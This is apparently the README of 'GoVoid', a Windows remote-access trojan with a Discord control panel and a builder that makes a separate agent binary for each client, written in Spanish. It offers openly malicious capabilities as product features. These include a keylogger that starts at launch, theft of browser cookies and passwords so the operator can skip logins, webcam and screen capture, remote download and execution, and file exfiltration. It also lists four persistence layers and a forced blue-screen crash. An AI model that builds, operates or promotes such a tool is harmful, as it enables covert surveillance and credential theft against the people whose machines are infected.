# GoVoid

Agente remoto para Windows con panel de control en Discord, y una herramienta de escritorio que genera una copia del agente por cliente a partir de tres datos: token de bot, id de servidor y webhook.

Go 1.22+. Sin CGO. Solo `discordgo` y `golang.org/x/sys`.

## Piezas

| Pieza | Qué es |
|---|---|
| `cmd/agent` | El agente. Se instala, conecta al gateway y atiende comandos desde el servidor. |
| `cmd/studio` | GoVoid Studio. GUI Win32 para generar el agente de un cliente. |
| `internal/kit` | Motor de compilación compartido por Studio y el builder de consola. |
| `cmd/builder` | Misma función que Studio, por terminal. |
| `cmd/winres` | Inyecta icono, manifiesto y versión en un exe ya compilado. |
| `cmd/panic` | Botón de pánico local (última salida si el bot deja de responder). |

## Compilar

```
build_studio.bat
```

Compila Studio, inyecta los recursos y deja una copia en `dist/`.

## GoVoid Studio

Descarga el `.exe` desde [Releases](../../releases) y ejecútalo. No necesita instalador ni Go.

Tres campos: token del bot, id de la guild y URL del webhook. El identificador, el nombre del binario, la carpeta de salida, las tareas, el servicio y la RunKey se derivan del id de la guild.

`Probar conexión` valida los tres datos contra Discord antes de compilar. `Compilar agente` produce:

```
dist/<ID>/
  <id>.exe
  ENTREGA.txt
  SHA256SUMS.txt
  <nombre>-<id>-<fecha>.zip
```

El token se guarda cifrado con DPAPI en `%APPDATA%\GoVoidStudio\studio.json`.

## Comandos

Se ejecutan en el canal de sesión del equipo. El panel publica además quince botones con las mismas acciones.

| Comando | Qué hace | Para qué |
|---|---|---|
| `/shell <cmd>` | Ejecuta en `cmd.exe` y devuelve la salida. | Todo lo que no tiene comando propio. |
| `/screenshot` | Captura el escritorio. | Ver qué hay en pantalla. |
| `/sysinfo` | Hostname, usuario, IP, Windows, privilegios. | Primera foto del equipo. |
| `/ps list` | Lista procesos con PID y memoria. | Ver qué corre encima. |
| `/ps kill <pid>` | Mata el proceso y sus hijos. | Quitar lo que estorba. |
| `/keylog start` | Reengancha el keylogger si lo detuviste. | Captura activa sin reiniciar. |
| `/keylog stop` | Lo detiene hasta el próximo arranque. | Cortar la captura en caliente. |
| `/keylog dump` | Publica lo capturado desde el último dump. | Extraer el log, sin pasar por start. |
| `/download <ruta>` | Sube un archivo o carpeta comprimida. | Sacar lo que interesa. |
| `/upload <url>` | Descarga y opcionalmente ejecuta. | Meter una herramienta. |
| `/clip get` | Lee el portapapeles. | Recuperar lo último copiado. |
| `/clip set <texto>` | Escribe el portapapeles. | Dejar algo listo para pegar. |
| `/msgbox <título> <texto> [icono]` | Abre un aviso en pantalla. | Hablar con quien está delante. |
| `/webcam` | Captura un frame de la cámara. | Ver quién está. |
| `/passwords` | Cookies y contraseñas de Chrome, Edge y Brave. | Entrar sin pasar por login. |
| `/lockscreen on [min]` | Cortina negra, teclado y ratón bloqueados. | Congelar la máquina. |
| `/lockscreen off` | Levanta la cortina. | Devolver el control. |
| `/lockscreen status` | Dice si está activa. | Comprobar el estado. |
| `/elevate` | Pide UAC y relanza como admin. | Todo lo que necesita administrador. |
| `/bsod [diagnostico]` | Fuerza un bugcheck. | Apagar sin cierre limpio. |
| `/kill` | Apaga el agente hasta el próximo arranque. | Silenciarlo un rato. |
| `/shutdown` | Apaga el agente y borra la persistencia. | Retirada limpia. |

## Cómo funciona el agente

- **Una instancia por equipo**, garantizada con mutex. Las copias sobrantes salen solas.
- **Un canal `sesion-N`** por equipo en la guild. Ahí vive el panel y ahí se responde.
- **Cuatro capas de persistencia**: RunKey, tarea de logon, tarea de arranque como SYSTEM y servicio. Un watchdog revisa cada minuto y relanza si falta.
- **Reconexión** con espera creciente, más watchdog de red para la sesión zombi.
- **Identidad propia** por cliente: nombre, servicio, tareas, registro y carpeta salen de `internal/config` y se fijan al compilar con `-ldflags -X`.
- **Keylogger activo desde el arranque**: el hook `WH_KEYBOARD_LL` se monta al abrir el binario, sin comando. Escribe en lote a `ProgramData`, sobrevive reinicios y `/keylog dump` entrega solo lo nuevo.
- **Sin puertos abiertos**: todo sale hacia el gateway y el webhook.
- **Una aplicación de Discord por cliente**: dos agentes con el mismo token se expulsan.

## Estructura

```
cmd/        binarios
internal/   bot, comandos, identidad, kit de compilación, win32
```

## Licencia

Uso privado. Ver `LICENSE`.
